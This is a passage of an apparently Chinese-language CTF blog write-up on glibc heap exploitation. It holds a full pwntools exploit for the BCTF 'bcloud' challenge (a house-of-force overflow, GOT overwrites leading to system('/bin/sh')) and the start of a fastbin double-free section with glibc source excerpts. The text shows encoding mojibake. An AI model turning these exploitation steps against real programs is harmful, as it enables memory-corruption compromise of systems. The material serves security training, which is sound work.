class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your name:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)s, <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;\n&#x27;</span>);<br>  v2 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  name_chunk_0x40 = (<span class="hljs-type">int</span>)v2;<br>  <span class="hljs-built_in">strcpy</span>(v2, s);<br>  some_output(v2);                              <span class="hljs-comment">// ä¿¡æ¯æ³„éœ²</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">some_output</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;</span>, a1);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now let&#x27;s set synchronization options.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>åœ¨åé¢çš„<code>org_host_init</code>å‡½æ•°ä¸­å¯¹äºorgåŠhostçš„åˆå§‹åŒ–ä¹Ÿåƒä¸Šè¿°ä¸€æ ·ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°<code>strcpy</code>åœ¨ç»™orgèµ‹å€¼çš„æ—¶å€™ä¼šå°†orgå­—ç¬¦ä¸²ã€orgè¿”å›åœ°å€ä»¥åŠhostå­—ç¬¦ä¸²å…¨éƒ¨èµ‹ç»™orgï¼Œä»è€Œé€ æˆå †æº¢å‡ºæ„é€ æˆ‘ä»¬ä½¿ç”¨<code>house of force</code>çš„æ¡ä»¶ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">org_host_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> org_chunk_con[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-9Ch] BYREF</span><br>  <span class="hljs-type">char</span> *org_chunk; <span class="hljs-comment">// [esp+5Ch] [ebp-5Ch]</span><br>  <span class="hljs-type">char</span> host_chunk_con[<span class="hljs-number">68</span>]; <span class="hljs-comment">// [esp+60h] [ebp-58h] BYREF</span><br>  <span class="hljs-type">char</span> *host_chunk; <span class="hljs-comment">// [esp+A4h] [ebp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+ACh] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">memset</span>(org_chunk_con, <span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Org:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)org_chunk_con, <span class="hljs-number">64</span>, <span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Host:&quot;</span>);<br>  my_input((<span class="hljs-type">int</span>)host_chunk_con, <span class="hljs-number">64</span>, <span class="hljs-number">10</span>);<br>  host_chunk = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  org_chunk = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>u);<br>  org_chunk_addr = (<span class="hljs-type">int</span>)org_chunk;<br>  host_chunk_addr = (<span class="hljs-type">int</span>)host_chunk;<br>  <span class="hljs-built_in">strcpy</span>(host_chunk, host_chunk_con);<br>  <span class="hljs-built_in">strcpy</span>(org_chunk, org_chunk_con);    <span class="hljs-comment">// &lt;---</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OKay! Enjoy:)&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>åœ¨åç»­çš„<code>new_note</code>ã€<code>show_note</code> ã€<code>edit_note</code>ã€ <code>del_note</code>ä¾¿ä¸ºå¸¸è§„æ“ä½œï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ç¨‹åºæœ€å¤šåˆ›å»º10ä¸ªnodeï¼Œå°†å…¶åœ°å€å’Œå¤§å°åˆ†åˆ«å‚¨å­˜åœ¨<code>node_list</code>å’Œ<code>node_size_list</code>ä¸­ï¼Œä»è€Œæ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨<code>edit_note</code>çš„æ—¶å€™ä¿®æ”¹æŸäº›å€¼ã€‚</p>
</li>
</ul>
<h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><ul>
<li>æ³„æ¼ heap åœ°å€</li>
<li>åˆ©ç”¨æº¢å‡ºä¿®æ”¹ top chunk çš„ size</li>
<li>åˆ†é…ä¸€ä¸ª chunkï¼Œå°† top chunk è½¬ç§»åˆ° node_size_list æ•°ç»„å‰é¢</li>
<li>å†æ¬¡åˆ†é… chunkï¼Œå³å¯è¦†ç›– node_list ï¼Œå¹¶åˆ©ç”¨ Edit ä¿®æ”¹å…¶å†…å®¹</li>
<li>ä¿®æ”¹ <code>free@got.plt</code> ä¸º <code>puts@got.plt</code>ï¼Œæ³„æ¼ libc</li>
<li>ä¿®æ”¹ <code>atoi@got.plt</code> ä¸º <code>system@got.plt</code>ï¼Œå¾—åˆ° shell</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li><p>ä½¿ç”¨nameçš„è¾“å…¥ -ã€‹ æ³„éœ²å †åœ°å€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak the heap addr</span><br><span class="hljs-comment"># dbg()</span><br>io.sendafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>)<br>heap = u32(io.recvuntil(<span class="hljs-string">b&quot;! Welcome to BCTF&quot;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">4</span>:])<br>log.info(<span class="hljs-string">f&quot;heap_addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220814182744179.png" srcset="/img/loading.gif" lazyload alt="image-20220814182744179"></p>
</li>
<li><p>åˆ©ç”¨orgå’Œhostçš„è¾“å…¥ -ã€‹ ä¿®æ”¹top chunkçš„sizeä¸º-1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># overflow</span><br>io.sendafter(<span class="hljs-string">&quot;Org:\n&quot;</span>, <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x40</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Host:\n&quot;</span>, p32(<span class="hljs-number">0xffffffff</span>))<br><span class="hljs-comment"># dbg()</span><br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220814194641198.png" srcset="/img/loading.gif" lazyload alt="image-20220814194641198"></p>
</li>
<li><p>è®¡ç®—hack_chunk çš„å¤§å° å°†top_chunkç§»åŠ¨è‡³bssæ®µ</p>
<p>0x804b0a0 -&gt; note_size_list</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">new((<span class="hljs-number">0x804b0a0</span> - <span class="hljs-number">0x10</span>) - (heap + <span class="hljs-number">0xd0</span>), <span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
<li><p>æ–°å»ºä¸€ä¸ªchunk è¦†ç›–note_list æ•°ç»„ï¼Œå¹¶ä¿®æ”¹å…¶å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span><br>payload += p32(elf.got.free) <span class="hljs-comment"># note[0]</span><br>payload += p32(elf.got.atoi) * <span class="hljs-number">2</span> <span class="hljs-comment"># note[1] note[2]</span><br>new(<span class="hljs-number">0x8c</span>, payload)<br><span class="hljs-comment"># dbg()</span><br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220814212052885.png" srcset="/img/loading.gif" lazyload alt="image-20220814212052885"></p>
</li>
<li><p>ä¿®æ”¹free_got ä¸º puts_got æ³„éœ²libcåœ°å€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># free@got.plt -&gt; puts@plt</span><br>edit(<span class="hljs-number">0</span>, p32(elf.plt.puts))<br>dele(<span class="hljs-number">1</span>)<br>atoi_addr = u32(io.recvn(<span class="hljs-number">4</span>))<br>io.recv()<br>libc.address = atoi_addr - libc.sym.atoi<br>log.info(<span class="hljs-string">f&quot;libc addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220814212638115.png" srcset="/img/loading.gif" lazyload alt="image-20220814212638115"></p>
</li>
<li><p>ä¿®æ”¹ atoi_got ä¸º system_gotï¼Œ è·å¾—shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">system_addr = libc.sym.system<br>log.info(<span class="hljs-string">f&quot;system addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.sym.system)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># dbg()</span><br>io.sendline(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>edit(<span class="hljs-number">2</span>, p32(system_addr))<br>io.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="Heap.assets/image-20220814214814810.png" srcset="/img/loading.gif" lazyload alt="image-20220814214814810"></p>
</li>
</ul>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = context.binary = ELF(<span class="hljs-string">&#x27;./bcloud&#x27;</span>)<br>libc = elf.libc<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>io = start()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">length, context</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;note content:\n&quot;</span>, <span class="hljs-built_in">str</span>(length))<br>    io.sendlineafter(<span class="hljs-string">&quot;content:\n&quot;</span>, context)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, context</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.sendlineafter(<span class="hljs-string">&quot;content:\n&quot;</span>, context)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;option---&gt;&gt;\n&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;id:\n&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(io)<br>    pause()<br><span class="hljs-comment"># leak the heap addr</span><br><span class="hljs-comment"># dbg()</span><br>io.sendafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>)<br>heap = u32(io.recvuntil(<span class="hljs-string">b&quot;! Welcome to BCTF&quot;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">4</span>:])<br>log.info(<span class="hljs-string">f&quot;heap_addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># overflow</span><br>io.sendafter(<span class="hljs-string">&quot;Org:\n&quot;</span>, <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x40</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Host:\n&quot;</span>, p32(<span class="hljs-number">0xffffffff</span>))<br><span class="hljs-comment"># dbg()</span><br><br>new((<span class="hljs-number">0x804b0a0</span> - <span class="hljs-number">0x10</span>) - (heap + <span class="hljs-number">0xd0</span>), <span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br><span class="hljs-comment"># new((0xffffffff - (heap + 0xd0) + (0x804b0a0 - 0x10)), b&#x27;aaaa&#x27;)</span><br><span class="hljs-comment"># dbg()</span><br><span class="hljs-comment"># new(0x40, b&quot;a&quot;*0x40)</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span><br>payload += p32(elf.got.free) <span class="hljs-comment"># note[0]</span><br>payload += p32(elf.got.atoi) * <span class="hljs-number">2</span> <span class="hljs-comment"># note[1] note[2]</span><br>new(<span class="hljs-number">0x8c</span>, payload)<br><span class="hljs-comment"># dbg()</span><br><span class="hljs-comment"># free@got.plt -&gt; puts@plt</span><br>edit(<span class="hljs-number">0</span>, p32(elf.plt.puts))<br>dele(<span class="hljs-number">1</span>)<br>atoi_addr = u32(io.recvn(<span class="hljs-number">4</span>))<br>io.recv()<br>libc.address = atoi_addr - libc.sym.atoi<br>log.info(<span class="hljs-string">f&quot;libc addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br><br>system_addr = libc.sym.system<br>log.info(<span class="hljs-string">f&quot;system addr -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.sym.system)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># dbg()</span><br>io.sendline(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>edit(<span class="hljs-number">2</span>, p32(system_addr))<br><br>io.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="Fastbin-Dub"><a href="#Fastbin-Dub" class="headerlink" title="Fastbin Dub"></a>Fastbin Dub</h3><h4 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>åˆ©ç”¨double-freeé”™è¯¯ï¼Œå¼ºåˆ¶mallocè¿”å›ä¸€ä¸ªchunkä¸¤æ¬¡ï¼Œä¸­é—´ä¸é‡Šæ”¾å®ƒã€‚è¿™ç§æŠ€æœ¯é€šå¸¸æ˜¯é€šè¿‡ç ´åfastbinå…ƒæ•°æ®ï¼Œå°†ä¸€ä¸ªå‡çš„å—é“¾æ¥åˆ°fastbinä¸­æ¥åˆ©ç”¨çš„ã€‚è¿™ä¸ªå‡å—å¯ä»¥è¢«åˆ†é…ï¼Œç„¶åç¨‹åºåŠŸèƒ½å¯ä»¥è¢«ç”¨æ¥è¯»å–æˆ–å†™å…¥ä¸€ä¸ªä»»æ„çš„å†…å­˜ä½ç½®ã€‚</p>
<h4 id="è¯¦æƒ…-1"><a href="#è¯¦æƒ…-1" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h4><p>fastbinä¸­double freeæ£€æŸ¥åªç¡®ä¿è¢«é‡Šæ”¾åˆ°fastbinä¸­çš„å—ä¸æ˜¯è¯¥binä¸­çš„ç¬¬ä¸€ä¸ªå—(é“¾è¡¨å¤´éƒ¨çš„å—ã€åˆšåˆšé‡Šæ”¾çš„å—)ï¼Œå¦‚æœåœ¨ä¸¤ä¸ªbinä¹‹é—´é‡Šæ”¾äº†ä¸€ä¸ªç›¸åŒå¤§å°çš„ä¸åŒå—ï¼Œåˆ™æ£€æŸ¥é€šè¿‡ã€‚</p>
<ul>
<li><p>æ­£å¸¸æƒ…å†µ:</p>
<p><img src="Heap.assets/image-20220820160146712.png" srcset="/img/loading.gif" lazyload alt="image-20220820160146712"></p>
</li>
<li><p>double free:</p>
<p><img src="Heap.assets/image-20220820161049541.png" srcset="/img/loading.gif" lazyload alt="image-20220820161049541"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span><br>        mchunkptr old = *fb, old2;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to add</span><br><span class="hljs-comment">               (i.e., double free).  */</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>)) &#123;<br>                errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            <span class="hljs-comment">/* Check that size of fastbin chunk at the top is the same as</span><br><span class="hljs-comment">               size of the chunk that we are adding.  We can dereference OLD</span><br><span class="hljs-comment">               only if we have the lock, otherwise it might have already been</span><br><span class="hljs-comment">               deallocated.  See use of OLD_IDX below for the actual check.  */</span><br>            <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>                old_idx = fastbin_index(chunksize(old));<br>            p-&gt;fd = old2 = old;<br>        &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);<br><br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="hljs-number">0</span>)) &#123;<br>            errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br></code></pre></td></tr></table></figure></li>
<li><p>ç»•è¿‡ double free:</p>
<p><img src="Heap.assets/image-20220820162024274.png" srcset="/img/loading.gif" lazyload alt="image-20220820162024274"></p>
</li>
</ul>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨é‡Šæ”¾æ—¶è¿˜ä¼šæ£€æŸ¥å½“å‰å—çš„sizeåŸŸä¸å¤´éƒ¨åŸŸæ˜¯å¦ç›¸ç­‰ï¼Œç”±äºæˆ‘ä»¬é‡Šæ”¾çš„æ˜¯åŒä¸€ä¸ªå—ï¼Œä¹Ÿå°±ä¸å­˜åœ¨è¯¥é—®é¢˜ã€‚</p>
<h4 id="å¦‚ä½•åˆ©ç”¨fastbin-dup"><a href="#å¦‚ä½•åˆ©ç”¨fastbin-dup" class="headerlink" title="å¦‚ä½•åˆ©ç”¨fastbin dup"></a>å¦‚ä½•åˆ©ç”¨fastbin dup</h4><p>å°†ä¸€ä¸ªå—äºŒæ¬¡é‡Šæ”¾åï¼Œæˆ‘ä»¬ç»§ç»­mallocä¸€ä¸ªç›¸åŒå¤§å°çš„å—ï¼Œæ­¤æ—¶mallocå°†ä»fastbinä¸­åˆ›å»ºå—ï¼Œè€Œä¸æ˜¯åœ¨top chunkä¸­åˆ›å»ºã€‚æ­¤æ—¶æˆ‘ä»¬å¾€è¿™ä¸ªå—ä¸­å¡«å†™æ•°æ®å°±æ„å‘³ç€æˆ‘ä»¬æ­£åœ¨ä¿®æ”¹è¿™ä¸ªå—çš„fdæŒ‡é’ˆï¼Œå°†å…¶ä¿®æ”¹ä¸ºä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„å€¼å³å¯ã€‚</p>
<p><img src="Heap.assets/image-20220820164643151.png" srcset="/img/loading.gif" lazyload alt="image-20220820164643151"></p>
<p>ä½†æ˜¯æ­¤è¿‡ç¨‹ä¸­ä¹Ÿå­˜åœ¨ç€ä¸€ä¸ªå¯¹sizeåŸŸçš„æ£€æŸ¥æªæ–½ï¼Œå› æ­¤æˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨__malloc_hookå‰35å­—èŠ‚æ‰€å‡ºç°çš„ä¸€ä¸ª0x7fçš„å¤§å°å­—æ®µï¼Œç„¶åå°†__malloc_hookä¿®æ”¹ä¸ºone_gadgetã€‚æ‰€éœ€è¦æ³¨æ„çš„æ˜¯å‡å°ºå¯¸å­—æ®µä¸­ä¸å…¼å®¹çš„æ ‡å¿—ï¼Œä¸€ä¸ªè®¾ç½®çš„NON_MAIN_ARENAæ ‡å¿—å’Œä¸€ä¸ªæ¸…é™¤çš„ CHUNK_IS_MMAPPEDæ ‡å¿—ä¼šå¯¼è‡´ä¸€ä¸ªsegfaultã€‚èƒ½å¤Ÿè¿™æ ·åšçš„åŸå› æ˜¯ï¼Œåˆ†é…æ—¢ä¸å—å¯¹é½æ£€æŸ¥ï¼Œä¹Ÿä¸å—æ ‡å¿—æŸåæ£€æŸ¥</p>
<p><img src="Heap.assets/image-20220820181022737.png" srcset="/img/loading.gif" lazyload alt="image-20220820181022737"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ())) &#123;<br>    idx = fastbin_index (nb);<br>    mfastbinptr *fb = &amp;fastbin (av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))<br>             != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index (chunksize(victim)) != idx, <span class="hljs-number">0</span>)) &#123;<br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>            malloc_printerr(check_action, errstr, chunk2mem (victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        check_remalloced_chunk (av, victim, nb);<br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="ç¤ºä¾‹ä¸€ï¼šfastbin-dup"><a href="#ç¤ºä¾‹ä¸€ï¼šfastbin-dup" class="headerlink" title="ç¤ºä¾‹ä¸€ï¼šfastbin_dup"></a>ç¤ºä¾‹ä¸€ï¼šfastbin_dup</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§é™„ä»¶ <a href="attachment/fastbin_dup/fastbin_dup">fastbin_dup</a></p>
</blockquote>
<h5 id="ç›®æ ‡-1"><a href="#ç›®æ ‡-1" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h5><ul>
<li>ä¿®æ”¹targetçš„å€¼</li>
<li>è·å–shell</li>
</ul>
